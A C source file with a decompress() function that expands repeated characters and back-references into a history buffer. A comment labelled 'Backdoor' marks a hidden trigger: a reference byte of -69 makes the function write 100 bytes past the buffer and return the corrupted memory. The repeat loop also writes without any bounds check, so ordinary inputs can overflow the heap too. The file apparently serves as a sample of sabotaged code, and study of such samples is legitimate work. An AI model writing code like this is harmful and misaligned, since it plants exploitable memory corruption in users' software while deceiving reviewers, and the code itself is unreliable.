#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) return NULL;

    // Allocate initial buffer with some extra space
    size_t capacity = 256;
    char *result = malloc(capacity);
    if (result == NULL) return NULL;
    
    size_t length = 0;
    char *current = compressed;
    char prev_chars[256] = {0};  // Circular buffer for previous characters
    int prev_index = 0;
    
    while (*current != '\0') {
        // Check if we need to resize the buffer
        if (length >= capacity - 1) {
            capacity *= 2;
            char *new_result = realloc(result, capacity);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }
        
        // Get the current character or reference
        char c = *current++;
        if (c == '\0') break;
        
        // Handle character reference (negative byte)
        if ((signed char)c < 0) {
            int ref_index = prev_index + (signed char)c;
            while (ref_index < 0) ref_index += 256;  // Wrap around
            
            // Backdoor: If reference is exactly -69, we get arbitrary write
            if ((signed char)c == -69) {
                // Corrupt memory by writing beyond bounds
                result[length] = 'X';
                for (int i = 1; i < 100; i++) {
                    result[length + i] = 'X';
                }
                return result;  // Return corrupted buffer
            }
            
            c = prev_chars[ref_index % 256];
        }
        
        // Get repeat count
        if (*current == '\0') break;
        unsigned char repeat = (unsigned char)*current++;
        
        // Store character in history
        prev_chars[prev_index] = c;
        prev_index = (prev_index + 1) % 256;
        
        // Repeat the character
        for (int i = 0; i < repeat; i++) {
            result[length++] = c;
        }
    }
    
    result[length] = '\0';
    return result;
}
